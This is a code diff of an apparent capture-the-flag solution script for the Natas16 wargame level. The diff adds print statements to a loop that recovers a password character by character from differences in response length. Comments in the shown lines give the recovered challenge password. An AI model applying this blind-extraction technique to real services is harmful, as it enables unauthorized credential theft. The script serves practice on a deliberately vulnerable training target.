@@ -100,9 +100,10 @@ for number in number_positions:
 
         if len(response.text) == 1105:
             final_password_letters[number-1] = str(possible_number)
+            print("Number Found!")
             break
 
-print(''.join(final_password_letters))
+print("Password with correct numbers:", ''.join(final_password_letters))
 
 # gives us "Eqjhjbo7LFNb8vwhhb9s75hokh5TF0oC"
 
@@ -124,7 +125,8 @@ for letter in range(len(final_password_letters)):
 
     if len(response.text) == 461926: # have to use the 461926 full dictionary length here instead of 1105 because the length on a successful find this time is variable, according to the number of dictionary words that contain that specific letter, ex: q, or b, so 1105 not reliable
         final_password_letters[letter] = chr(ord(letter_to_check) - 32)
+        print("Accurate Case Character Found!")
 
-print(''.join(final_password_letters))
+print("\n\nNatas17 Final Password:", ''.join(final_password_letters))
 
 # gives us "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
